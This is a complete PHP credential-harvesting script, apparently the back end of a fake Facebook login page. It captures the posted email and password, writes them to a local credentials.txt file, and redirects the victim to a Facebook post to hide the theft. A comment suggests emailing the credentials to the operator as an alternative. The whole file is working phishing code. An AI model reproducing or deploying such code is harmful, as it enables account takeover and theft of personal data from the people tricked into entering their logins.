<?php
// Capture the login credentials
$email = $_POST['email'];
$password = $_POST['pass'];

// Save the credentials to a file or send them to your email
$file = fopen("credentials.txt", "a");
fwrite($file, "Email: $email\nPassword: $password\n\n");
fclose($file);

// Redirect to the specific Facebook post
header("Location: https://www.facebook.com/share/p/Rd1JGb6dT8ZFAts/");
exit();
?>
